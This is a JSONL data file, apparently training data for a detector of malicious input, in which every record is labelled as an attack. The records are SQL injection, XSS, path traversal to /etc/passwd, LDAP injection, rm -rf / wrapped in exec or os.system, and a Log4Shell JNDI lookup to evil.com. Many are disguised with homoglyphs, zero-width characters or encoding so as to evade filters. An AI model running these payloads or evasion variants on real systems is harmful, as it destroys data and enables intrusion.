+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eval('malicious\\x20\\x20\\x20\\x20code')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "eval('malicious    code')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "jаvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UnIoN  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')‌", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION​ SELECT null, null, null FROM information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION  SеLECT  null,  null,  null  FROM  informаtion_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jаva.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "UNION  SеLECT  null,  null,  null  FROM  information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
